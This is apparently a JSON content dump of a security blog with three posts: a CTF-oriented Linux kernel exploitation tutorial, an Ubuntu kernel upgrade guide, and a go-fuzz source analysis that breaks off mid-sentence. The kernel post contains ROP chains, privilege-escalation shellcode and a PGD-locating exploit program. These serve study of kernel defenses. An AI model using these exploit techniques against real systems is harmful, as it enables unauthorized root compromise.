{"meta":{"title":"RainSec","subtitle":"","description":"致力于云原生安全和自动化渗透测试的研究与分享","author":"RainSec","url":"https://rainsec.cn","root":"/"},"pages":[{"title":"about","date":"2022-01-28T03:36:25.000Z","updated":"2022-01-28T03:36:25.402Z","comments":true,"path":"about/index.html","permalink":"https://rainsec.cn/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-07-14T04:39:04.000Z","updated":"2022-07-20T05:27:57.522Z","comments":true,"path":"categories/index.html","permalink":"https://rainsec.cn/categories/index.html","excerpt":"","text":""},{"title":"links","date":"2022-01-28T03:37:00.000Z","updated":"2022-01-28T03:37:00.466Z","comments":true,"path":"links/index.html","permalink":"https://rainsec.cn/links/index.html","excerpt":"","text":""},{"title":"tags","date":"2014-12-22T04:39:04.000Z","updated":"2022-07-20T05:28:08.938Z","comments":true,"path":"tags/index.html","permalink":"https://rainsec.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux Kernel 保护机制绕过","slug":"Linux Kernel 保护机制绕过","date":"2022-07-19T10:48:45.000Z","updated":"2022-07-20T08:22:49.379Z","comments":true,"path":"/post/Linux Kernel 保护机制绕过.html","link":"","permalink":"https://rainsec.cn/post/Linux%20Kernel%20%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87.html","excerpt":"","text":"Linux Kernel 保护机制绕过 好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。 SMEP + KPTI bypass​ SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。 ​ 检测计算机是否开启SMEP保护的方式很简单，cat /proc/cpuinfo | grep smep，如果有匹配到一些信息的话就说明计算机开启了SMEP保护。在CTF赛事中一般会给一些kernel启动的sh脚本，从这些脚本里面我们也可以看出虚拟机在启动kernel时是否开启了SMEP保护： #!/bin/sh qemu-system-x86_64 -initrd initramfs.cpio \\ -kernel bzImage \\ -append 'console=ttyS0 oops=panic panic=1 nokaslr' \\ -monitor /dev/null \\ -m 64M --nographic \\ -smp cores=1,threads=1 \\ 这里是没开启SMEP的脚本，如果在脚本里面加入SMEP相关的cpu参数那么就是开启了SMEP机制。 #!/bin/sh qemu-system-x86_64 -initrd initramfs.cpio \\ -kernel bzImage \\ -append 'console=ttyS0 oops=panic panic=1 nokaslr' \\ -monitor /dev/null \\ -m 64M --nographic \\ -smp cores=1,threads=1 \\ -cpu kvm64,smep 还有一种判断SMEP机制是否开启的方法是通过cr4寄存器的值： 第20位代表的就是SMEP机制是否开启，获取cr4寄存器值的方法也很简单，一种可以通过debuger去attach要调试的kernel，另一种就是通过触发SMEP机制的crash ​ KPTI机制更多的是一种页表隔离的机制，当在用户态和内核态之间进行状态切换的时候KPTI机制会尽量减少用户态页表中的内核地址，同时内核页表中所有的用户态页都被设置为NX使得用户态的页不具备可执行权限，这是一种防范Meltdown类似攻击的机制。 ​ 检测KPTI机制是否开启的方法有很多，cat /proc/cpuinfo | grep pti或者类似上面说到的cpu参数-cpu kvm64,smep，或者检查进程页表，但是这需要你可以查看物理内存，通过内核任意读取的原语可以做到，但是需要进行虚拟地址和物理地址之间的转换，这就需要你具备一定的内存管理知识和多级页表相关知识，这些基础知识这里就不细说了，下面举例一些demo看如何获取相关物理地址。 void *pgd = get_current()-&gt;mm-&gt;pgd; get_current() 会帮助获取当前的task_struct，然后得到mm_struct结构体类型的mm成员，所有的进程地址空间都包含该结构体里面，其中pgd字段代表的是全局页目录，拿到地址之后进行页表地址转换就可以拿到对应的物理地址，那么在多级页表的处理过程中可以拿到每一级页表的入口地址，该地址的NX bit就表明该页表是否开启了NX，结论就是，正常情况下每一级页表的NX位是没设置的，但是全局页目录设置了NX bit，因为在多级页表解析的过程中全局页目录是共享的。 ROP绕过​ 内核里面的rop和用户态其实是非常相似的，做rop最基本的就是先获取到vmlinux，以ctf赛题来说一般提供的都是压缩后的bzImage，这里可以通过vmlinux-to-elf工具来实现解压缩： ./vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt; 然后通过ROPgadget或者ropper从vmlinux里面获取gadget ROPgadget --binary vmlinux &gt; gadgets gadget的寻找原则其实不是固定的，要看场景丁需求，不过类似mov esp, 0xf7000000 ; ret这样的一般都很不错（注意常量一定要对齐），可以将esp指向我们分配的地址然后接下来的ret操作就容易被控制进而执行rop链。但是ROPgadget是不会检查相关段是否开启了NX的。 ​ 对于SMEP来说，它由cr4寄存器控制，因此可以通过改变cr4寄存器的第20 bit的值来进行绕过，比如使用native_write_cr4函数： void native_write_cr4(unsigned long val) { unsigned long bits_missing = 0; set_register: asm volatile(\"mov %0,%%cr4\": \"+r\" (val), \"+m\" (cr4_pinned_bits)); if (static_branch_likely(&amp;cr_pinning)) { if (unlikely((val &amp; cr4_pinned_bits) != cr4_pinned_bits)) { bits_missing = ~val &amp; cr4_pinned_bits; val |= bits_missing; goto set_register; } /* Warn after we've set the missing bits. */ WARN_ONCE(bits_missing, \"CR4 bits went missing: %lx!?\\n\", bits_missing); } } EXPORT_SYMBOL(native_write_cr4); 但是从代码里面的警告就可以看出，在较新版本的内核中，该函数已经不能改变第20bit和第21bit的值了， ​ 对于KPTI就比较麻烦了，一种方法是如果具备内核任意读写和当前进程页表的地址，那么就可以直接通过关闭NX bit来实现，但是都任意读写了，直接修改cred结构体可能会更香一点。那么最好的方式其实应该去利用kernel本身的代码来帮助实现这一绕过过程，下面是kernel entry的部分代码，主要是用于内核态到用户态的切换，这其实很符合exp的需求，原本exp不能成功执行的主要原因就是在返回用户态之后执行的代码所在页其实属于内核，这个切换它成功的进行了页表切换，因接下来用到的就是用户态的页表，。 GLOBAL(swapgs_restore_regs_and_return_to_usermode) #ifdef CONFIG_DEBUG_ENTRY /* Assert that pt_regs indicates user mode. */ testb $3, CS(%rsp) jnz 1f ud2 1: #endif POP_REGS pop_rdi=0 /* * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS. * Save old stack pointer and switch to trampoline stack. */ movq %rsp, %rdi movq PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp /* Copy the IRET frame to the trampoline stack. */ pushq 6*8(%rdi) /* SS */ pushq 5*8(%rdi) /* RSP */ pushq 4*8(%rdi) /* EFLAGS */ pushq 3*8(%rdi) /* CS */ pushq 2*8(%rdi) /* RIP */ /* Push user RDI on the trampoline stack. */ pushq (%rdi) /* * We are on the trampoline stack. All regs except RDI are live. * We can do future final exit work right here. */ STACKLEAK_ERASE_NOCLOBBER SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi /* Restore RDI. */ popq %rdi SWAPGS INTERRUPT_RETURN 到此，其实就不难理解为什么kernel exp里面很多类似这样的ROP code: pivot_stack[0] = 0xcafedeadbeef; pivot_stack[i++] = pop_rdi; pivot_stack[i++] = 0; pivot_stack[i++] = prepare_kernel_cred; pivot_stack[i++] = pop_rdx; pivot_stack[i++] = 8; pivot_stack[i++] = cmp; pivot_stack[i++] = mov_rdi_rax; pivot_stack[i++] = commit_creds; pivot_stack[i++] = kpti_trampoline; pivot_stack[i++] = 0x12345678; // RAX pivot_stack[i++] = 0x87654321; // RDI pivot_stack[i++] = (unsigned long)u_code; //userspace_rip; pivot_stack[i++] = 0x33; //userspace_cs; pivot_stack[i++] = 0x246; //userspace_rflags; pivot_stack[i++] = (unsigned long)u_stack; //userspace_rsp; pivot_stack[i++] = 0x2b; //userspace_ss; 至于最开始的0xcafedeadbeef，这其实是为了触发page fault handler，因此根据linux demand-on-paging的原则，只有触发该handler的情况下才会真正mmaping。 ​ 还有一种方法是通过signal handler。 get root​ 获取root权限的方式在内核里面还算比较统一的，基本很多都是通过 commit_creds(prepare_kernel_cred(0))。 确定cred structure结构体的地址来进行权限提升。 ctf里面可能会用到的方法就是通过chmod 修改flag文件为777权限然后挂起，然后通过用户空间的一个进程来读取文件内容。 ​ 那么shellcode的写法就比较直接了，假设通过cat /proc/kallsyms得到了grep commit_creds和grep prepare_kernel_cred的地址： xor rdi, rdi mov rcx, prepare_kernel_cred_addr call rcx mov rdi, rax mov rcx, commit_creds_addr call rcx ret 这种shellcode没有做内核地址空间与用户地址空间的转换，因此可能比较局限，适用于仅仅存在一个retun 0类似指令的目标函数。为了适配更多的场景，需要做内核态和用户态的上下文切换，在linux kernel 源码中详细介绍了如何进入内核态： 64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,then loads new ss, cs, and rip from previously programmed MSRs.rflags gets masked by a value from another MSR (so CLD and CLACare not needed). SYSCALL does not save anything on the stackand does not change rsp. 注：MSR 从内核态返回用户态可以通过Linux提供的一些指令SYSRET，SYSEXIT，IRET，其中SYSRET和IRET可以适用于所有的CPU供应商，并且被包含在x86_64的标准里面，SYSRET需要利用MSR特殊读写指令因而较为麻烦，因此一般采用IRET。该指令的含义就是从中断返回，通过查看AMD64手册可以看出在保护模式下IRET对应IRETQ，那么我们只需要在执行IRETQ之前按顺序放置好RIP, CS, RFLAGS, RSP, SS，最后还需要知道的时候swapgs指令，它的语义是：Exchange GS base with KernelGSBase MSR，在linux syscall entry的代码哪里也存在该指令的调用，因此在通过system call返回用户空间的时候我们需要再做一次swapgs用于恢复GS。 swapgs push userspace_ss push userspace_rsp push userspace_rflags push userspace_cs push userspace_rip iretq ​ 还有一种方法就是上述的第三条，第一步需要先找到chmod func的地址： 可以看到__x64_sys_chmod的地址是0xffffffff872dacf0，在内核调试中对该地址下断点就可以得到该如何给它附加参数： movzx edx, word ptr [rdi + 0x68] mov rsi, qword ptr [rdi + 0x70] mov edi, 0xffffff9c call 0xffffffff811a1b50 不过要记得，/flag字符串存放地址应该使用内核空间地址，同时由于Linux kernel本身采用的是Non-Preemptive Threading Model，因此在kernel thred的执行过程中一般不会进行上下文切换，除非调用了特殊的API，通过sleep当前thread其实就是一个很好的迫使kernel进行上下文切换的，当然kernel里面的sleep和用户态有很大的差别，需要调用不同的API，这里我选择的是msleep(): 那么，完整的shellcode就有了： ; commit_cred(prepare_kernel_creds(0)) xor rdi, rdi mov rcx, prepare_kernel_cred_addr call rcx mov rdi, rax mov rcx, commit_creds_addr call rcx ; chmod 777 flag mov r15, 0x67616c662f mov r14, 0xdeadf00 mov [r14], r15 mov rdi, 0xffffff9c mov rsi, r14 mov rdx, 0777 mov rcx, x64_chmod_addr call rcx ; msleep(0x1000000) mov rdi, 0x1000000 mov rcx, msleep_addr call rcx int 3 然后我们让exp在后台执行，前台执行cat flag实现文件读取。 总结​ 在通过ROP编写shellcode的时候要注意两点： 在exp中的mmap产生的shellcode地址不在之前kernel访问的页表里面，那么在执行的时候就会触发double fault。 栈指针必须在向上向下两个方向上都还剩比较宽阔的空间unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);，因为Linux kernel func 比如 commit_creds需要使用栈空间并且不能使用低于0xf7000000大小的地址，否则会引起uncatchable page fault，MAP_GROWSDOWN是无效的，因为它只能用于用户态。 SMEP+PTI+SMAP+KASLR bypass KASLR就不多解释了，就是一个kernel的地址随机化 SMAP​ SMAP是Supervisor Mode Access Prevention，它使得用户态的指针无法在内核态被解引用，这无疑会使得ROP难以有效使用。 ​ 在qemu里面-cpu kvm64,smep,smap表明开启了SMAP机制，当然cat /proc/cpuinfo | grep smap也可以看出来。 SMAP bypass​ 通过分析linux kernel的mmap实现其实就可以知道我们可以通过类似linux kernel heap spray的方式将用户空间的代码映射到内核里面，只需要用MAP_POPULATE的flag: MAP_POPULATE (since Linux 2.5.46) Populate (prefault) page tables for a mapping. For a file mapping, this causes read-ahead on the file. This will help to reduce blocking on page faults later. The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB). MAP_POPULATE is supported for private mappings only since Linux 2.6.23. 这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小： #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/fcntl.h&gt; #include &lt;sys/mman.h&gt; #include &lt;sys/stat.h&gt; int main (int argc, char **argv){ int cnt = 0; void *pg; while(1) { pg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0); if (pg == MAP_FAILED) { perror(\"mmap\"); break; } else { cnt++; if (cnt % 1000 == 0) { printf(\"[*] allocated %d pages, asking for more...\\n\", cnt); } } } printf(\"[*] number of pages allocated: %d\\n\", cnt); return 0; } 通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，那就是它们一般都是连续分配的。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。 ​ 那么应该如何获得物理地址呢？通过文档发现，在Linux中每一个进程都维护一个指针mm_struct-&gt;pgd指向该进程的**Page Global Directory (PGD)**，表里面包含的是pgd_t数组，pgd_t定义在asm/page.h里面根据不同的架构拥有不同的值，在x86架构下mm_struct-&gt;pgd会被复制到cr3寄存器。 ​ 可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过/proc/(pid)/pagemap获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如： 最高位为1。 最低字节为0x67。 那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 &lt;&lt; 12)开始）中的值来判断是否符合自己刚才通过spraying注入的大量地址，如果一个地址的内容符合自己注入的地址，同时索引0x100的结果为0，那么基本就能确定PGD的地址了。 #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/fcntl.h&gt; #include &lt;sys/mman.h&gt; #include &lt;sys/stat.h&gt; #include &lt;string.h&gt; #define VULN_READ 0x1111 #define VULN_WRITE 0x2222 #define VULN_STACK 0x3333 #define VULN_PGD 0x4444 #define VULN_PB 0x5555 #define SPRAY_CNT 0x10000 struct rwRequest { void *kaddr; void *uaddr; size_t length; }; unsigned long pageOffsetBase = 0xffff888000000000; int Open(char *fname, int mode) { int fd; if ((fd = open(fname, mode)) &lt; 0) { perror(\"open\"); exit(-1); } return fd; } void write64(unsigned long kaddr, unsigned long value) { struct rwRequest req; unsigned long value_ = value; req.uaddr = &amp;value_; req.length = 8; req.kaddr = (void *)kaddr; int fd = Open(\"/dev/vuln\", O_RDONLY); if (ioctl(fd, VULN_WRITE, &amp;req) &lt; 0) { perror(\"ioctl\"); exit(-1); } } unsigned long read64(unsigned long kaddr) { struct rwRequest req; unsigned long value;; req.uaddr = &amp;value; req.length = 8; req.kaddr = (void *)kaddr; int fd = Open(\"/dev/vuln\", O_RDONLY); if (ioctl(fd, VULN_READ, &amp;req) &lt; 0) { perror(\"ioctl\"); exit(-1); } close(fd); return value; } unsigned long leak_stack() { struct rwRequest req; unsigned long stack; int fd = Open(\"/dev/vuln\", O_RDONLY); req.uaddr = &amp;stack; if (ioctl(fd, VULN_STACK, &amp;req) &lt; 0) { perror(\"ioctl\"); exit(-1); } close(fd); return stack; } unsigned long leak_pgd() { struct rwRequest req; unsigned long pgd = 0xcccccccc; int fd = Open(\"/dev/vuln\", O_RDONLY); req.uaddr = &amp;pgd; if (ioctl(fd, VULN_PGD, &amp;req) &lt; 0) { perror(\"ioctl\"); exit(-1); } close(fd); return pgd; } unsigned long leak_physmap_base() { struct rwRequest req; unsigned long pgd = 0xcccccccc; int fd = Open(\"/dev/vuln\", O_RDONLY); req.uaddr = &amp;pgd; if (ioctl(fd, VULN_PB, &amp;req) &lt; 0) { perror(\"ioctl\"); exit(-1); } close(fd); return pgd; } int check_page(unsigned long addr) { unsigned long page[0x101]; for (int i = 0; i &lt; 0x101; i++) { page[i] = read64(addr + i*8); } for (int i = 0; i &lt; 0x100; i++) { if (((page[i] &amp; 0xff) != 0x67) || (!(page[i] &gt;&gt; 63))) { return 0; } } return page[0x100] == 0; } int main (int argc, char **argv){ void *pg; unsigned long search_addr; search_addr = pageOffsetBase + (0x7c000 &lt;&lt; 12); for (unsigned long i = 1; i &lt; 0x100; i++) { pg = mmap((void *)(i &lt;&lt; 39), 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0); if (pg == MAP_FAILED) { perror(\"mmap\"); exit(-1); } } printf(\"[*] starting search from addr %p\\n\", (void *)search_addr); while(1) { if (check_page(search_addr)) { printf(\"[+] located the PGD: %p\\n\", (void *)search_addr); break; } search_addr += 0x1000; } printf(\"[*] this is the actual PGD: %p\\n\", (void *)leak_pgd()); return 0; } ​ 如此可以在用户空间通过大量的mmap，然后拿到其物理地址，然后通过内核态的地址转换将该物理地址转换为内核的虚拟地址通过kernel module进行读取就会发现内核可以读取到用户态的数据。 ​ 如此就知道绕过的原理了，总结一下就是通过内核空间和用户空间确定相同的物理页然后让kernel进行代码执行。 KASLR bypass​ KASLR其实就是内核态的地址随机化，类似用户态的做法，bypass可以通过确定基地址然后加上固定偏移来解决。但是观察/proc/kallsyms的内容发现一些符号其实是完全自己在随机，而不是拥有一个固定的偏移，这就引出了Linux Kernel的一个机制Function Granular KASLR，简单来说就是内核在加载的时候会以函数级别重新排布内核代码。 ​ 但是FG-KASLR并不完善，一些内核区域并不会随机化： 不幸，commit_creds 和 prepare_kernel_cred在FG-KASLR的区域。 swapgs_restore_regs_and_return_to_usermode和__x86_retpoline_r15函数不受到FG-KASLR影响，这能帮助找到一些gadget。 内核符号表ksymtab不受影响，这里存储了一些偏移可以用于计算prepare_kernel_cred和commit_creds的地址。 ​ 第三个比较感兴趣： struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; }; 可以看出value_offset应该是比较有趣的，这个对应的值也可以通过/proc/kallsyms获取： 因此一般就可以在ROP中利用任意读读出相对应的偏移用于计算其它函数的具体位置。 总结​ 网上看到一段总结，感觉很不错： 如果内核没有保护，就直接ret2usr。 如果开了SMEP，就用ROP 溢出或者位置被限制在栈上，就用pivot gadget进行栈迁移。 KPTI利用KPTI trampoline或者signal handler SMAP会导致stack pivot很难利用 如果没有KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。 如果有FG-KASLR，记得利用ksymtab和不受影响的区域。 参考链接 https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/ https://github.com/pr0cf5/kernel-exploit-practice","categories":[{"name":"Linux","slug":"Linux","permalink":"https://rainsec.cn/categories/Linux/"},{"name":"Kernel","slug":"Linux/Kernel","permalink":"https://rainsec.cn/categories/Linux/Kernel/"}],"tags":[{"name":"Kernel","slug":"Kernel","permalink":"https://rainsec.cn/tags/Kernel/"}],"author":"Clock"},{"title":"Ubuntu 20.04更新内核到指定版本","slug":"Ubuntu20.04 升级降级内核到指定版本","date":"2022-03-28T10:38:45.000Z","updated":"2022-07-20T08:20:43.387Z","comments":true,"path":"/post/Ubuntu20.04 升级降级内核到指定版本.html","link":"","permalink":"https://rainsec.cn/post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html","excerpt":"记一次更新内核到5.8.0-33-generic","text":"记一次更新内核到5.8.0-33-generic 更新到指定版本查看当前版本$ uname -r 4.15.0-101-generic $ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 20.04 LTS Release: 20.04 Codename: focal 查看当前已经安装的 Kernel Image$ dpkg --get-selections |grep linux-image linux-image-5.4.0-90-generic purge linux-image-5.8.0-33-generic install linux-image-generic install 查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库$ apt-cache search linux | grep linux-image 安装指定版本的 Kernel Image 和 Kernel Header$ sudo apt-get install linux-headers-5.8.0-33-generic linux-image-5.8.0-33-generic 查看当前的Kernel列表$ grep menuentry /boot/grub/grub.cfg if [ x\"${feature_menuentry_id}\" = xy ]; then menuentry_id_option=\"--id\" menuentry_id_option=\"\" export menuentry_id_option menuentry 'Ubuntu' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' { submenu 'Advanced options for Ubuntu' $menuentry_id_option 'gnulinux-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' { menuentry 'Ubuntu, with Linux 5.8.0-33-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' { menuentry 'Ubuntu, with Linux 5.8.0-33-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' { menuentry 'Ubuntu, with Linux 5.4.0-90-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' { menuentry 'Ubuntu, with Linux 5.4.0-90-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' { 修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置$ sudo vim /etc/default/grub # GRUB_DEFAULT=0 GRUB_DEFAULT=\"Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.8.0-33-generic\" 生效配置$ update-grub $ reboot 删除不需要的Kernel查询不包括当前内核版本的其它所有内核版本$ dpkg -l | tail -n +6| grep -E 'linux-image-[0-9]+'| grep -Fv $(uname -r) pi linux-image-5.4.0-90-generic 5.4.0-90.101 amd64 Signed kernel image generic Kernel 状态： rc：表示已经被移除 ii：表示符合移除条件（可移除） iU：已进入 apt 安装队列，但还未被安装（不可移除） 删除指定的Kerneldpkg --purge linux-image-5.4.0-90-generic","categories":[{"name":"Zitui","slug":"Zitui","permalink":"https://rainsec.cn/categories/Zitui/"},{"name":"Ubuntu","slug":"Zitui/Ubuntu","permalink":"https://rainsec.cn/categories/Zitui/Ubuntu/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://rainsec.cn/tags/Linux/"}],"author":"Zitui"},{"title":"Go-fuzz的解析与思考","slug":"Go-Fuzz解析与思考","date":"2022-03-25T10:48:45.000Z","updated":"2022-07-20T08:20:50.563Z","comments":true,"path":"/post/Go-Fuzz解析与思考.html","link":"","permalink":"https://rainsec.cn/post/Go-Fuzz%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83.html","excerpt":"","text":"Go-fuzz的解析与思考go-fuzz Go-fuzz的原理很多都是基于AFL，这里只分析了一些它独特的地方，收获很多，也希望可以和大家交流，如有分析错误还望交流指正。 ​ go-fuzz是google开源的一款go语言fuzz框架，它和AFL很大的一个不同是在于，AFL通常通过对未修改的文件的输入进行操作，而go-fuzz需要你编写一个Fuzz函数，go-fuzz通过不断的调用该函数来进行fuzz，前者通常会为每一个输入创建一个新的进程，后者则是不断的调用Fuzz函数因此不需要经常启动或者重启进程。 什么是覆盖引导型Fuzz​ 覆盖引导型Fuzz通过代码覆盖率信息来决定一个突变是否有效，如果代码覆盖率增长就保存该输入并对其进行持续变异，否则就丢弃该变异： 源码解析go-fuzz-build模块​ 该模块的主要作用在于将需要测试的包信息和测试用例信息打包方便进行测试。 利用PProf进行性能分析 加载选中的go语言包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个fuzz材料包 遍历加载的go语言包里面所有的函数名查找所有的名为Fuzz的函数，同时进行签名认证，但是Fuzz函数的个数应该大于0同时小于等于255 获取环境变量，大多是和go有关的环境变量. 加载go语言标准库 忽略一些标准库中的包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个包，因为没有理由进行fuzz测试，为了避免陷入循环（具体为啥我也不是很清楚） 在/tmp下创建临时文件夹保存需要使用的tools和包 接下来就是很高阶的语法树等的建立过程，这个过程中会使用gatherLiterals获取到你提供的初始材料 获取到需要fuzz的包的具体信息，进而可以生成go-fuzz的元数据 将存储信息的cover.exe和sonar.exe已经metadata打包生成zip文件夹 语法树插桩实现​ go语言不同于C语言可以as等汇编工具来较为方便的实现编译时插桩（具体可以参考AFL的插桩方式），为了实现go语言的编译时插桩，我们首先要了解go语言整体的编译流程： 词法与语法分析 类型检查 中间代码生成 机器码生成 那么其实大致就可以看出比较理想的地方就是词法与语法分析的时候对抽象语法书进行插桩了，同时go标准库也提供了scanner，ast和token等相关库来帮助很好的扫描，解析和创建相关抽象语法树，在整个插桩的过程中其实是把go的包一个个遍历插桩的，然后因为go-fuzz不允许导入main包，其实是因为它在插桩完成之后会自己加入相关的main函数。 ​ 在go-fuzz-build中实现了结构体File和结构体Sonar，这两个结构体都实现了自己的Visit()函数用来遍历相关的语法树： type File struct { fset *token.FileSet pkg string fullName string astFile *ast.File blocks *[]CoverBlock info *types.Info } type Sonar struct { fset *token.FileSet fullName string pkg string blocks *[]CoverBlock info *types.Info } 在整个的build的过程中也会生成coverBin和sonarBin两个文件分别对应上述两个结构体的语法树遍历函数执行结果。 File遍历​ 在生成coverBin的时候使用的是File结构体对应的Visit遍历函数，不过在开始遍历之前会通过自身实现的addImport来实现go-fuzz-dep包相关内容的导入： file.addImport(“go-fuzz-dep”, fuzzdepPkg, “CoverTab”) func (f *File) addImport(path, name, anyIdent string) { newImport := &amp;ast.ImportSpec{ Name: ast.NewIdent(name), Path: &amp;ast.BasicLit{ Kind: token.STRING, Value: fmt.Sprintf(\"%q\", path), }, } impDecl := &amp;ast.GenDecl{ Lparen: f.astFile.Name.End(), Tok: token.IMPORT, Specs: []ast.Spec{ newImport, }, Rparen: f.astFile.Name.End(), } // Make the new import the first Decl in the file. astFile := f.astFile astFile.Decls = append(astFile.Decls, nil) copy(astFile.Decls[1:], astFile.Decls[0:]) astFile.Decls[0] = impDecl astFile.Imports = append(astFile.Imports, newImport) // Now refer to the package, just in case it ends up unused. // That is, append to the end of the file the declaration // var _ = _cover_atomic_.AddUint32 reference := &amp;ast.GenDecl{ Tok: token.VAR, Specs: []ast.Spec{ &amp;ast.ValueSpec{ Names: []*ast.Ident{ ast.NewIdent(\"_\"), }, Values: []ast.Expr{ &amp;ast.SelectorExpr{ X: ast.NewIdent(name), Sel: ast.NewIdent(anyIdent), }, }, }, }, } astFile.Decls = append(astFile.Decls, reference) } 观察源码其实逻辑也很简单，首先创建了一个基本声明信息节点来将相关的包导入原本的语法树中，同时为了避免导入包但是未使用，所以导入简单的声明语句。导入完成之后使用ast.Walk()来遍历语法树，该函数会调用File结构体对应的Visit函数。 // 源码太长，只贴部分 func (f *File) Visit(node ast.Node) ast.Visitor { switch n := node.(type) { case *ast.FuncDecl: if n.Name.String() == \"init\" { // Don't instrument init functions. // They run regardless of what we do, so it is just noise. return nil } case *ast.GenDecl: if n.Tok != token.VAR { return nil // constants and types are not interesting } case *ast.BlockStmt: // {}中间的语句 // If it's a switch or select, the body is a list of case clauses; don't tag the block itself. if len(n.List) &gt; 0 { switch n.List[0].(type) { case *ast.CaseClause: // switch for _, n := range n.List { clause := n.(*ast.CaseClause) clause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false) } return f case *ast.CommClause: // select for _, n := range n.List { clause := n.(*ast.CommClause) clause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false) } return f } } n.List = f.addCounters(n.Lbrace, n.Rbrace+1, n.List, true) // +1 to step past closing brace. ...... } 可以看出在遍历语法树的过程中对节点的类型进行了判断，然后对{}中间的内容进行一个判断和插桩，具体的插桩函数如下： func (f *File) addCounters(pos, blockEnd token.Pos, list []ast.Stmt, extendToClosingBrace bool) []ast.Stmt { // Special case: make sure we add a counter to an empty block. Can't do this below // or we will add a counter to an empty statement list after, say, a return statement. if len(list) == 0 { return []ast.Stmt{f.newCounter(pos, blockEnd, 0)} } // We have a block (statement list), but it may have several basic blocks due to the // appearance of statements that affect the flow of control. var newList []ast.Stmt for { // Find first statement that affects flow of control (break, continue, if, etc.). // It will be the last statement of this basic block. var last int end := blockEnd for last = 0; last &lt; len(list); last++ { end = f.statementBoundary(list[last]) if f.endsBasicSourceBlock(list[last]) { extendToClosingBrace = false // Block is broken up now. last++ break } } if extendToClosingBrace { end = blockEnd } if pos != end { // Can have no source to cover if e.g. blocks abut. newList = append(newList, f.newCounter(pos, end, last)) // 在List里面增加counter计数器 } newList = append(newList, list[0:last]...) list = list[last:] if len(list) == 0 { break } pos = list[0].Pos() } return newList } 假设现在有一个switch的demo func main() { var n = 1 switch n { case 0: fmt.Println(\"this is 0\") case 1: fmt.Println(\"this is 1\") } } 这一步的具体操作就是把每一个case拿出来，然后将case相关的语法树的起始位置和结束位置还有body部分全部传入addCounters，addCounters的逻辑起始也非常简单，如果body为空就直接返回一个Counter的ast.Stmt声明语法树结构， Counter是作者自定义的一种插桩计数器，这种计数器主要包括两个部分: 对于每个包的File的结构体都维护了一个*[]CoverBlock，每次增加Counter都会在这个数组里面增加一个CoverBlock里面记录了插桩语法树的位置以及内部是否还包含多少其他声明。 